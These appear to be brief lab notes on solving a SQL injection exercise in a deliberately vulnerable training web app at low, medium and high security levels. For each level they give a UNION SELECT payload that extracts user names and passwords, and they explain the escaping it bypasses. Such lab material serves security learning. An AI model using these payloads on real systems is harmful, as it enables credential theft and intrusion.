### Security level: LOW
* ' UNION SELECT user,password FROM users#
* Must escape from WHERE user_id = '$id';"
* first name and surname are the username and password respectively
 just like the query

### Security level: MEDIUM:

* 1 or 1=1 UNION SELECT user,password FROM users#
* This line in the source code will filter anything that is a string in id: $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
* Must escape from WHERE user_id = $id; which is easier since $id is not in strings this time.

### Security level: HIGH:

* ' UNION SELECT user,password FROM users#
